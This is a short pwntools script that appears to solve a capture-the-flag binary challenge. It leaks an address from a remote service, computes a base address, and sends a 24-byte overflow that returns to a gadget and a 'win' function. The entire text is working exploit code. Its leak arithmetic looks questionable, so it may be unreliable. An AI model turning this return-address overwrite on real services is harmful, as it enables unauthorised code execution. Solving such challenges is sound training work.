from pwn import *

elf = ELF("./challx")
r = remote("192.168.44.1", 5000)
# r = process("./challx")
r.recvuntil(b": ") 
x = r.recv(18)
print(x)#7ffd1cdfaa28
leak = int(x, 16)
base = leak-(next(elf.search("Your format string : ")))
info(f"base : {hex(base)}")
payload = b'a'*24 +p64(base+0x11f3)+ p64(base+elf.sym.win)

r.sendline(payload)

r.interactive()
